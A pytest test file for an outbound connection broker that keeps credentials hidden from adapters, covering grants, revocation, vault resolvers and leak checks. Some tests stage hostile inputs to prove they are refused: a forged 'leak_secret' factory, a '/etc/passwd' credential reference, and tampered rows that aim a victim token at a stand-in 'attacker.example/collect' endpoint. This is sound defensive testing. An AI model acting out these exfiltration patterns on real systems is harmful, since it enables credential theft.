from __future__ import annotations

import gc
import hashlib
import inspect
import json
import os
from dataclasses import dataclass
from pathlib import Path

import pytest

from tinyassets.credential_vault import write_credential_vault
from tinyassets.storage.outbound_connections import (
    AmbiguousProxyOutcome,
    ConnectionLedger,
    CredentialBlindBroker,
    GrantResolutionError,
    ProxyRequestError,
    _GeneralVaultCredentialResolver,
    _TrustedCredentialResolver,
)

ROOT = Path(__file__).resolve().parents[1]


@dataclass
class _JsonlDispatch:
    path: str

    def records(self):
        path = Path(self.path)
        if not path.exists():
            return []
        return [
            json.loads(line)
            for line in path.read_text(encoding="utf-8").splitlines()
        ]


@dataclass
class _JsonlAudit:
    path: str

    def __call__(self, record):
        with Path(self.path).open("a", encoding="utf-8") as stream:
            stream.write(json.dumps(record, sort_keys=True) + "\n")

    def records(self):
        path = Path(self.path)
        if not path.exists():
            return []
        return [
            json.loads(line)
            for line in path.read_text(encoding="utf-8").splitlines()
        ]


def _runtime_log(tmp_path, grant_id, filename):
    runtime_id = hashlib.sha256(grant_id.encode("utf-8")).hexdigest()
    return tmp_path / ".outbound-proxy" / runtime_id / filename


def test_connection_and_per_universe_grant_persist_with_revocation(tmp_path):
    db_path = tmp_path / "boundary.db"
    ledger = ConnectionLedger(db_path)

    connection = ledger.create_connection(
        connection_id="conn-github",
        owner_user_id="user-1",
        connection_class="outbound-mcp",
        scopes=("pull_requests:write",),
        provider="github",
        destination="github.com/acme/widgets",
        credential_ref="vault://github/user-1",
    )
    grant = ledger.grant_connection(
        grant_id="grant-u1",
        connection_id=connection.connection_id,
        owner_user_id="user-1",
        universe_id="universe-1",
    )

    reopened = ConnectionLedger(db_path)
    assert reopened.get_connection("conn-github") == connection
    assert reopened.get_grant("grant-u1") == grant
    assert reopened.revoke_grant("grant-u1", revoked_at=123.0) is True
    assert reopened.get_grant("grant-u1").revoked_at == 123.0


def test_revoking_connection_invalidates_all_grants_and_cap_evaluation(tmp_path):
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        verify_authenticated_principal=lambda: "user-1",
    )
    _grant_github_connection(ledger)

    assert ledger.revoke_connection("conn-github", revoked_at=321.0) is True
    assert ledger.get_connection("conn-github").revoked_at == 321.0
    with pytest.raises(GrantResolutionError, match="revoked"):
        ledger.evaluate_unprompted_action_cap(
            grant_id="grant-github",
            action_value=1,
            action_unit="pull_requests",
        )
    with pytest.raises(GrantResolutionError, match="revoked"):
        ledger.resolve_scoped_proxy(
            universe_id="universe-1",
            connection_class="pull-request-writer",
        )


def test_migration_010_persists_connections_grants_and_connector_artifacts():
    migration = (
        ROOT
        / "prototype"
        / "full-platform-v0"
        / "migrations"
        / "010_outbound_boundary.sql"
    )
    sql = migration.read_text(encoding="utf-8")

    assert "CREATE TABLE boundary.connections" in sql
    assert "CREATE TABLE boundary.connection_grants" in sql
    assert "CREATE TABLE boundary.connector_artifacts" in sql
    assert "CREATE TABLE boundary.connector_artifact_edges" in sql


def _grant_github_connection(
    ledger: ConnectionLedger,
    *,
    connection_id: str = "conn-github",
    grant_id: str = "grant-github",
    provider: str = "test-fixture.created",
    credential_ref: str = "test-fixture://nonsecret",
) -> None:
    ledger.create_connection(
        connection_id=connection_id,
        owner_user_id="user-1",
        connection_class="pull-request-writer",
        scopes=("pull_requests:write",),
        provider=provider,
        destination="github.com/acme/widgets",
        credential_ref=credential_ref,
    )
    ledger.grant_connection(
        grant_id=grant_id,
        connection_id=connection_id,
        owner_user_id="user-1",
        universe_id="universe-1",
    )


def test_resolve_scoped_proxy_uses_only_current_exact_grant(tmp_path):
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        allow_test_fixtures=True,
        verify_authenticated_principal=lambda: "user-1",
    )
    _grant_github_connection(ledger)
    dispatched = _JsonlDispatch(
        str(_runtime_log(tmp_path, "grant-github", "network.jsonl"))
    )

    proxy = ledger.resolve_scoped_proxy(
        universe_id="universe-1",
        connection_class="pull-request-writer",
    )

    assert proxy.provider == "test-fixture.created"
    assert proxy.destination == "github.com/acme/widgets"
    assert proxy.request("pull_requests:write", {"title": "Ship"}) == {
        "status": "created"
    }
    assert dispatched.records() == [{
        "provider": "test-fixture.created",
        "destination": "github.com/acme/widgets",
        "verb": "pull_requests:write",
        "request": {"title": "Ship"},
    }]
    parameters = inspect.signature(ledger.resolve_scoped_proxy).parameters
    assert "dispatch" not in parameters
    assert "dispatch_factory" not in parameters
    assert "dispatch_config" not in parameters
    assert "owner_user_id" not in parameters


def test_resolve_exact_scoped_proxy_uses_named_grant_not_class_ambiguity(tmp_path):
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        allow_test_fixtures=True,
        verify_authenticated_principal=lambda: "user-1",
    )
    _grant_github_connection(ledger)
    _grant_github_connection(
        ledger,
        connection_id="conn-github-2",
        grant_id="grant-github-2",
    )

    proxy = ledger.resolve_exact_scoped_proxy(
        universe_id="universe-1",
        grant_id="grant-github",
        connection_id="conn-github",
    )

    assert proxy.grant_id == "grant-github"
    assert proxy.destination == "github.com/acme/widgets"
    proxy.close()


def test_production_vault_resolver_is_exact_to_universe_repo_and_reference(tmp_path):
    universe_dir = tmp_path / "universe-1"
    write_credential_vault(
        universe_dir,
        [{
            "credential_type": "vcs",
            "service": "github",
            "destination": "acme/widgets",
            "purpose": "write",
            "token": "requester-owned-secret",
        }],
    )
    resolver_type = getattr(
        __import__(
            "tinyassets.storage.outbound_connections",
            fromlist=["_ProductionVaultCredentialResolver"],
        ),
        "_ProductionVaultCredentialResolver",
    )
    resolver = resolver_type(
        universe_dir=universe_dir,
        provider="github",
        destination="github.com/acme/widgets",
    )

    assert resolver("vault://github/acme/widgets") == "requester-owned-secret"
    with pytest.raises(RuntimeError, match="credential reference"):
        resolver("vault://github/acme/other")


def test_production_github_driver_reads_only_exact_commit_repository(monkeypatch):
    # read_for_commit routes through the SSRF-hardened driver + destination-bound
    # allowlist UNCONDITIONALLY (channel-agnostic-outbound: no legacy urllib path).
    # Point that driver at a loopback stub and assert the exact wire request; the
    # repository-mismatch refusal is enforced BEFORE any network call.
    import http.server
    import socket
    import ssl
    import threading

    from tinyassets.storage import outbound_connections as _oc
    from tinyassets.storage.outbound_connections import _SsrfHardenedHttpDriver

    recorded: list[dict] = []

    class _Handler(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *_a):
            return

        def do_GET(self):  # noqa: N802
            recorded.append({"path": self.path})
            payload = b'[{"number": 17}]'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    port = server.server_address[1]

    class _PassThroughTLS:
        def __init__(self):
            self.verify_mode = ssl.CERT_NONE
            self.check_hostname = False

        def wrap_socket(self, sock, server_hostname=None):  # noqa: ANN001
            return sock

    def open_socket(_address, timeout, _src):
        return socket.create_connection(("127.0.0.1", port), timeout=timeout)

    def factory():
        return _SsrfHardenedHttpDriver(
            resolver=lambda _h, _p: ["127.0.0.1"],
            validator=lambda addr: addr,
            open_socket=open_socket,
            ssl_context=_PassThroughTLS(),
            allowed_ports=frozenset({443}),
        )

    monkeypatch.setattr(_oc, "_SsrfHardenedHttpDriver", factory)

    driver = _oc._ProductionGitHubNetworkDriver()
    try:
        result = driver(
            credential="requester-owned-secret",
            provider="github",
            destination="github.com/acme/widgets",
            verb="pull_requests:read_for_commit",
            request={
                "repository": "acme/widgets",
                "intended_head_sha": "a" * 40,
                "per_page": 100,
            },
        )
    finally:
        server.shutdown()
        server.server_close()

    assert result == [{"number": 17}]
    assert recorded[0]["path"].endswith(
        "/repos/acme/widgets/commits/" + "a" * 40 + "/pulls?per_page=100"
    )
    with pytest.raises(PermissionError, match="repository"):
        driver(
            credential="requester-owned-secret",
            provider="github",
            destination="github.com/acme/widgets",
            verb="pull_requests:read_for_commit",
            request={
                "repository": "acme/other",
                "intended_head_sha": "a" * 40,
                "per_page": 100,
            },
        )


def test_production_github_driver_routes_scoped_prepare_and_publish(monkeypatch):
    from tinyassets.effectors import github_pr

    calls = []

    def prepare(*, request, destination, capability_token):
        calls.append(("prepare", request, destination, capability_token))
        return {"commit_sha": "a" * 40, "tree_sha": "b" * 40}

    def publish(*, request, destination, capability_token):
        calls.append(("publish", request, destination, capability_token))
        return {"pr_number": 17, "pr_url": "https://github.com/acme/widgets/pull/17"}

    monkeypatch.setattr(github_pr, "_prepare_scoped_github_commit", prepare)
    monkeypatch.setattr(github_pr, "_publish_scoped_github_pull_request", publish)
    driver_type = getattr(
        __import__(
            "tinyassets.storage.outbound_connections",
            fromlist=["_ProductionGitHubNetworkDriver"],
        ),
        "_ProductionGitHubNetworkDriver",
    )
    driver = driver_type()
    prepare_request = {
        "operation": "prepare_commit",
        "repository": "acme/widgets",
    }
    publish_request = {
        "operation": "publish_pull_request",
        "repository": "acme/widgets",
    }

    assert driver(
        credential="requester-owned-secret",
        provider="github",
        destination="github.com/acme/widgets",
        verb="pull_requests:write",
        request=prepare_request,
    )["commit_sha"] == "a" * 40
    assert driver(
        credential="requester-owned-secret",
        provider="github",
        destination="github.com/acme/widgets",
        verb="pull_requests:write",
        request=publish_request,
    )["pr_number"] == 17
    assert [call[0] for call in calls] == ["prepare", "publish"]
    assert all(call[2:] == ("acme/widgets", "requester-owned-secret") for call in calls)


def test_resolve_scoped_proxy_refuses_caller_supplied_owner_identity(tmp_path):
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        allow_test_fixtures=True,
    )
    _grant_github_connection(ledger)
    forged_owner = ledger.get_grant("grant-github").owner_user_id

    with pytest.raises(TypeError, match="owner_user_id"):
        ledger.resolve_scoped_proxy(
            owner_user_id=forged_owner,
            universe_id="universe-1",
            connection_class="pull-request-writer",
        )


def test_resolve_scoped_proxy_fails_closed_without_principal_verifier(tmp_path):
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        allow_test_fixtures=True,
    )
    _grant_github_connection(ledger)

    with pytest.raises(PermissionError, match="principal verifier"):
        ledger.resolve_scoped_proxy(
            universe_id="universe-1",
            connection_class="pull-request-writer",
        )


def test_proxy_api_rejects_caller_supplied_factory_or_config(tmp_path):
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        allow_test_fixtures=True,
        verify_authenticated_principal=lambda: "user-1",
    )
    _grant_github_connection(ledger)
    with pytest.raises(TypeError, match="dispatch_factory"):
        ledger.resolve_scoped_proxy(
            universe_id="universe-1",
            connection_class="pull-request-writer",
            dispatch_factory="evil.module:leak_secret",
        )
    with pytest.raises(TypeError, match="dispatch_config"):
        ledger.resolve_scoped_proxy(
            universe_id="universe-1",
            connection_class="pull-request-writer",
            dispatch_config={"payload": "raw-secret"},
        )


def test_test_fixture_transport_is_disabled_by_default(tmp_path):
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        verify_authenticated_principal=lambda: "user-1",
    )
    _grant_github_connection(ledger)
    proxy = ledger.resolve_scoped_proxy(
        universe_id="universe-1",
        connection_class="pull-request-writer",
    )

    with pytest.raises(ProxyRequestError, match="outbound request failed"):
        proxy.request("pull_requests:write", {"title": "Must fail closed"})


@pytest.mark.parametrize("case", ["absent", "revoked", "ambiguous"])
def test_resolve_scoped_proxy_fails_closed_without_fallback(tmp_path, case):
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        allow_test_fixtures=True,
        verify_authenticated_principal=lambda: "user-1",
    )
    if case != "absent":
        _grant_github_connection(ledger)
    if case == "revoked":
        ledger.revoke_grant("grant-github")
    if case == "ambiguous":
        _grant_github_connection(
            ledger,
            connection_id="conn-github-2",
            grant_id="grant-github-2",
        )

    with pytest.raises(GrantResolutionError, match=case):
        ledger.resolve_scoped_proxy(
            universe_id="universe-1",
            connection_class="pull-request-writer",
        )


def test_adapter_cannot_recover_secret_from_state_environment_metadata_or_errors(
    tmp_path,
):
    secret = "raw-secret-never-visible-to-adapter"
    vault_path = tmp_path / "vault-secret.txt"
    vault_path.write_text(secret, encoding="utf-8")
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        allow_test_fixtures=True,
        verify_authenticated_principal=lambda: "user-1",
    )
    _grant_github_connection(
        ledger,
        provider="test-fixture.explode",
        credential_ref=f"test-vault-file:{vault_path}",
    )
    audit = _JsonlAudit(
        str(_runtime_log(tmp_path, "grant-github", "audit.jsonl"))
    )
    proxy = ledger.resolve_scoped_proxy(
        universe_id="universe-1",
        connection_class="pull-request-writer",
    )
    graph_state = {"connection": proxy}
    request_metadata = {
        "provider": proxy.provider,
        "destination": proxy.destination,
        "scopes": proxy.scopes,
    }
    assert not hasattr(proxy, "_dispatch")
    assert not hasattr(proxy, "_dispatch_handle")
    assert proxy._channel._process.pid != os.getpid()
    assert not hasattr(proxy._channel._process, "_args")
    assert "_PROXY_DISPATCHERS" not in vars(
        __import__(
            "tinyassets.storage.outbound_connections",
            fromlist=["outbound_connections"],
        )
    )
    gc.collect()
    assert not any(
        isinstance(candidate, CredentialBlindBroker)
        for candidate in gc.get_objects()
    )

    with pytest.raises(ProxyRequestError) as raised:
        proxy.request("pull_requests:write", {"title": "Ship"})

    adapter_observations = json.dumps(
        {
            "state": graph_state,
            "environment": dict(os.environ),
            "request_metadata": request_metadata,
            "proxy_error": str(raised.value),
            "proxy_repr": repr(proxy),
            "audit": audit.records(),
        },
        default=repr,
        sort_keys=True,
    )
    assert secret not in adapter_observations
    assert "test-vault-file:" not in adapter_observations
    assert audit.records() == [
        {
            "event": "outbound_proxy_error",
            "grant_id": "grant-github",
            "provider": "test-fixture.explode",
            "destination": "github.com/acme/widgets",
            "verb": "pull_requests:write",
            "reason": "destination request failed",
        }
    ]


def test_credential_resolver_exception_cannot_leak_secret_to_proxy_error(tmp_path):
    secret = "vault-provider-echoed-secret"
    vault_path = tmp_path / "vault-secret.txt"
    vault_path.write_text(secret, encoding="utf-8")
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        allow_test_fixtures=True,
        verify_authenticated_principal=lambda: "user-1",
    )
    _grant_github_connection(
        ledger,
        provider="test-fixture.explode",
        credential_ref=f"test-vault-error:{vault_path}",
    )
    audit = _JsonlAudit(
        str(_runtime_log(tmp_path, "grant-github", "audit.jsonl"))
    )
    proxy = ledger.resolve_scoped_proxy(
        universe_id="universe-1",
        connection_class="pull-request-writer",
    )

    with pytest.raises(ProxyRequestError) as raised:
        proxy.request("pull_requests:write", {"title": "Ship"})

    assert secret not in str(raised.value)
    assert secret not in json.dumps(audit.records())
    assert audit.records()[0]["reason"] == "credential unavailable"


def test_ambiguous_transport_error_cannot_leak_credential_material(tmp_path):
    secret = "transport-echoed-bearer-secret"
    ledger = ConnectionLedger(tmp_path / "boundary.db")
    _grant_github_connection(ledger)

    def raise_secret_bearing_error(**_kwargs):
        raise AmbiguousProxyOutcome(
            f"connection reset after send; Authorization: Bearer {secret}"
        )

    broker = CredentialBlindBroker(
        ledger,
        resolve_credential=lambda _ref, _ctype=None: secret,
        network_request=raise_secret_bearing_error,
    )

    with pytest.raises(AmbiguousProxyOutcome) as raised:
        broker.dispatch(
            "grant-github",
            "pull_requests:write",
            {"title": "Ship"},
        )

    assert secret not in str(raised.value)


def test_connector_definition_and_mcp_config_are_attributed_remixable_artifacts(
    tmp_path,
):
    ledger = ConnectionLedger(tmp_path / "boundary.db")
    original = ledger.create_connector_artifact(
        artifact_id="connector-github-v1",
        owner_user_id="creator",
        connector_definition={
            "name": "GitHub PR writer",
            "connection_class": "pull-request-writer",
        },
        mcp_client_config={
            "server": "https://github.example/mcp",
            "auth": "oauth",
            "scopes": ["pull_requests:write"],
        },
        created_at=10.0,
    )
    remix = ledger.remix_connector_artifact(
        parent_artifact_id=original.artifact_id,
        artifact_id="connector-github-v2",
        owner_user_id="remixer",
        connector_definition={
            **original.connector_definition,
            "name": "Acme GitHub PR writer",
        },
        mcp_client_config=original.mcp_client_config,
        created_at=20.0,
    )

    assert original.attribution == ("creator",)
    assert remix.parent_artifact_id == original.artifact_id
    assert remix.attribution == ("creator", "remixer")
    assert ledger.get_connector_artifact(remix.artifact_id) == remix


# --------------------------------------------------------------------------- #
# FIX 4 — production HTTP wiring must compose (Codex REJECT)
# --------------------------------------------------------------------------- #
def test_credential_resolver_construction_never_parses_the_destination(tmp_path, monkeypatch):
    # Pre-fix, _TrustedCredentialResolver.__init__ eagerly built the github
    # resolver, whose __init__ parses the destination as a repo — so a normal
    # http destination crashed the broker at startup. Construction must not parse.
    import tinyassets.credential_vault as cv

    monkeypatch.setattr(
        cv,
        "load_credential_vault",
        lambda _u: [{"credential_type": "http", "destination": "conn", "token": "http-tok"}],
    )
    resolver = _TrustedCredentialResolver(
        {
            "provider": "http",
            "connection_type": "http",
            "destination": "api.example.com",  # NOT a github repo
            "allow_test_fixtures": True,
            "universe_dir": str(tmp_path / "universe"),
            "owner_user_id": "user-1",
        }
    )
    # An http connection resolves ONLY through the general vault resolver.
    assert resolver("vault://http/conn") == "http-tok"


def test_http_resolver_never_vends_a_foreign_scheme_token(tmp_path):
    # Confused-deputy (Codex FIX 1): even if a foreign-scheme credential_ref
    # reaches the http credential resolver (a forged/tampered row), dispatch must
    # NOT vend a github/workos/slack token to the http driver. Connection-type
    # routing sends http to the general vault resolver ONLY, which refuses any
    # non-vault://http/ ref — the WorkOS/github resolvers are never even reached.
    resolver = _TrustedCredentialResolver(
        {
            "provider": "github",  # attacker sets provider=github on an http conn
            "connection_type": "http",
            "destination": "attacker.example",
            "allow_test_fixtures": True,
            "universe_dir": str(tmp_path / "universe"),
            "owner_user_id": "user-1",
        }
    )
    for foreign_ref in (
        "workos-pipes://github/victim-user",
        "vault://github/acme/widgets",
        "vault://slack/some-conn",
        "test-vault-file:/etc/passwd",
    ):
        with pytest.raises(RuntimeError):
            resolver(foreign_ref)


def test_github_resolver_is_lazy_and_construction_survives_bad_destination(tmp_path):
    # Even a github-provider resolver must construct without parsing a non-repo
    # destination (lazy construction); a fixture ref still resolves.
    resolver = _TrustedCredentialResolver(
        {
            "provider": "github",
            "connection_type": "",
            "destination": "api.example.com",  # not a repo — must not crash here
            "allow_test_fixtures": True,
            "universe_dir": str(tmp_path / "universe"),
            "owner_user_id": "user-1",
        }
    )
    assert resolver("test-fixture://nonsecret") == "trusted-child-fixture"


def test_general_vault_resolver_matches_http_record_only(tmp_path, monkeypatch):
    import tinyassets.credential_vault as cv

    records = [
        {"credential_type": "vcs", "service": "github", "destination": "x", "token": "GH"},
        {"credential_type": "http", "destination": "anthropic-conn", "token": "http-secret-token"},
    ]
    monkeypatch.setattr(cv, "load_credential_vault", lambda _u: records)
    resolver = _GeneralVaultCredentialResolver(universe_dir=str(tmp_path))
    assert resolver("vault://http/anthropic-conn") == "http-secret-token"
    with pytest.raises(RuntimeError):  # a non-http ref is not this resolver's job
        resolver("vault://github/x")
    with pytest.raises(RuntimeError):  # a missing record fails closed
        resolver("vault://http/nonexistent")


def _make_http_ledger_with_vault(tmp_path, *, credential_ref="vault://http/anthropic-conn"):
    """Real composition scaffolding: a REAL vault http record + an http connection."""
    universe_dir = tmp_path / "universe-1"
    write_credential_vault(
        universe_dir,
        [{
            "credential_type": "http",
            "destination": "anthropic-conn",
            "token": "real-vault-http-token",
        }],
    )
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        verify_authenticated_principal=lambda: "user-1",
    )
    ledger.create_connection(
        connection_id="conn-http",
        owner_user_id="user-1",
        connection_class="outbound-http",
        scopes=("POST",),
        provider="http",
        destination="api.example.com",
        credential_ref=credential_ref,
        connection_type="http",
        auth_scheme="bearer",
        allowed_endpoints=[
            {"host": "api.example.com", "path_template": "/v1/messages", "methods": ["POST"]},
        ],
    )
    ledger.grant_connection(
        grant_id="grant-http",
        connection_id="conn-http",
        owner_user_id="user-1",
        universe_id="universe-1",
    )
    return ledger


def test_http_broker_composition_resolves_through_real_general_vault_resolver(
    tmp_path, monkeypatch
):
    # THE real end-to-end composition (Codex FIX 4/finding 2): a credential stored
    # in the ACTUAL vault -> ledger -> grant -> spawned credential-blind broker ->
    # _GeneralVaultCredentialResolver -> HTTP driver. NO fixture resolver, NO
    # plaintext injection, NO fake _http. The request targets a non-allowlisted
    # host so the real driver's allowlist refuses it — proving the credential was
    # RESOLVED THROUGH THE REAL GENERAL RESOLVER (else the audit would record
    # "credential unavailable", not "destination request failed").
    monkeypatch.setenv("TINYASSETS_OUTBOUND_HTTP_CONNECTIONS_ENABLED", "1")
    ledger = _make_http_ledger_with_vault(tmp_path)

    proxy = ledger.resolve_exact_scoped_proxy(
        universe_id="universe-1",
        grant_id="grant-http",
        connection_id="conn-http",
    )
    assert proxy._channel._process.pid != os.getpid()  # a real spawned child
    try:
        with pytest.raises(ProxyRequestError):
            proxy.request(
                "POST",
                {"url": "https://not-allowed.example/v1/messages", "body": {"text": "hi"}},
            )
    finally:
        proxy.close()

    audit = _JsonlDispatch(str(_runtime_log(tmp_path, "grant-http", "audit.jsonl")))
    # Reached the driver layer via the REAL general resolver — NOT
    # "credential unavailable" (a resolution failure) and NOT a startup crash.
    assert [record["reason"] for record in audit.records()] == [
        "destination request failed"
    ]
    assert "real-vault-http-token" not in json.dumps(audit.records())


def test_forged_foreign_scheme_row_never_vends_a_token_to_the_http_driver(
    tmp_path, monkeypatch
):
    # Confused-deputy end-to-end (Codex FIX 1, dispatch side): forge a row whose
    # credential_ref is a foreign scheme (bypassing create_connection's guard by
    # tampering the DB directly). Through the REAL spawned broker, dispatch must
    # fail at credential RESOLUTION ("credential unavailable") — never reaching the
    # HTTP driver — so no github/workos token is ever POSTed to the attacker.
    import sqlite3

    monkeypatch.setenv("TINYASSETS_OUTBOUND_HTTP_CONNECTIONS_ENABLED", "1")
    ledger = _make_http_ledger_with_vault(tmp_path)
    # Tamper: swap the credential_ref to a WorkOS github token reference and point
    # the allowlist at the attacker's endpoint.
    with sqlite3.connect(tmp_path / "boundary.db") as raw:
        raw.execute(
            "UPDATE outbound_connections SET credential_ref = ? WHERE connection_id = ?",
            ("workos-pipes://github/victim-user", "conn-http"),
        )

    proxy = ledger.resolve_exact_scoped_proxy(
        universe_id="universe-1",
        grant_id="grant-http",
        connection_id="conn-http",
    )
    try:
        with pytest.raises(ProxyRequestError):
            proxy.request(
                "POST",
                {"url": "https://api.example.com/v1/messages", "body": {"x": 1}},
            )
    finally:
        proxy.close()

    audit = _JsonlDispatch(str(_runtime_log(tmp_path, "grant-http", "audit.jsonl")))
    # Failed at RESOLUTION — the http resolver refused the foreign ref and the
    # network driver was NEVER invoked (no exfil). NOT "destination request failed".
    assert [record["reason"] for record in audit.records()] == ["credential unavailable"]


def test_row_mutation_from_legacy_to_http_after_proxy_start_is_refused(
    tmp_path, monkeypatch
):
    # Codex FIX 1 TOCTOU (the exact repro): start a LEGACY proxy, then mutate its
    # row to connection_type="http" with an attacker allowlist while keeping the
    # legacy (non-http) credential_ref. Dispatch re-reads the mutated row but must
    # REFUSE it — the resolver's type frozen at proxy start is stale, yet the
    # credential is never resolved and the VICTIM token is never POSTed to the
    # attacker's endpoint.
    import sqlite3

    monkeypatch.setenv("TINYASSETS_OUTBOUND_HTTP_CONNECTIONS_ENABLED", "1")
    victim = tmp_path / "victim_token.txt"
    victim.write_text("VICTIM-GITHUB-TOKEN", encoding="utf-8")
    ledger = ConnectionLedger(
        tmp_path / "boundary.db",
        allow_test_fixtures=True,
        verify_authenticated_principal=lambda: "user-1",
    )
    ledger.create_connection(
        connection_id="conn-legacy",
        owner_user_id="user-1",
        connection_class="pull-request-writer",
        scopes=("POST",),
        provider="test-fixture.created",
        destination="github.com/acme/widgets",
        credential_ref=f"test-vault-file:{victim}",  # legacy (non-http) scheme
        connection_type="",
    )
    ledger.grant_connection(
        grant_id="grant-legacy",
        connection_id="conn-legacy",
        owner_user_id="user-1",
        universe_id="universe-1",
    )
    proxy = ledger.resolve_exact_scoped_proxy(
        universe_id="universe-1",
        grant_id="grant-legacy",
        connection_id="conn-legacy",
    )
    # Mutate the row AFTER the proxy (and its frozen resolver) started.
    attacker_allowlist = json.dumps([
        {
            "host": "attacker.example",
            "path_template": "/collect",
            "methods": ["POST"],
            "param_patterns": {},
            "allowed_query": [],
            "query_patterns": {},
        }
    ])
    with sqlite3.connect(tmp_path / "boundary.db") as raw:
        raw.execute(
            "UPDATE outbound_connections "
            "SET connection_type='http', allowed_endpoints_json=? "
            "WHERE connection_id=?",
            (attacker_allowlist, "conn-legacy"),
        )
    try:
        with pytest.raises(ProxyRequestError):
            proxy.request(
                "POST", {"url": "https://attacker.example/collect", "body": {"x": 1}}
            )
    finally:
        proxy.close()

    audit = _JsonlDispatch(str(_runtime_log(tmp_path, "grant-legacy", "audit.jsonl")))
    # Refused at credential resolution — the mutated http row's credential_ref
    # scheme (test-vault-file) does not match http, so nothing was resolved and
    # the network driver was NEVER invoked (no exfil to the attacker).
    assert [r["reason"] for r in audit.records()] == ["credential unavailable"]
    assert "VICTIM-GITHUB-TOKEN" not in json.dumps(audit.records())


def test_row_mutation_from_http_to_legacy_after_proxy_start_is_refused(
    tmp_path, monkeypatch
):
    # The reverse mutation: start an http proxy, then mutate its row to legacy
    # ("") while keeping the vault://http/ credential_ref. Dispatch must refuse —
    # a non-http row may not carry an http credential scheme.
    import sqlite3

    monkeypatch.setenv("TINYASSETS_OUTBOUND_HTTP_CONNECTIONS_ENABLED", "1")
    ledger = _make_http_ledger_with_vault(tmp_path)
    proxy = ledger.resolve_exact_scoped_proxy(
        universe_id="universe-1",
        grant_id="grant-http",
        connection_id="conn-http",
    )
    with sqlite3.connect(tmp_path / "boundary.db") as raw:
        raw.execute(
            "UPDATE outbound_connections SET connection_type='' WHERE connection_id=?",
            ("conn-http",),
        )
    try:
        with pytest.raises(ProxyRequestError):
            proxy.request(
                "POST", {"url": "https://api.example.com/v1/messages", "body": {"x": 1}}
            )
    finally:
        proxy.close()

    audit = _JsonlDispatch(str(_runtime_log(tmp_path, "grant-http", "audit.jsonl")))
    assert [r["reason"] for r in audit.records()] == ["credential unavailable"]
    assert "real-vault-http-token" not in json.dumps(audit.records())
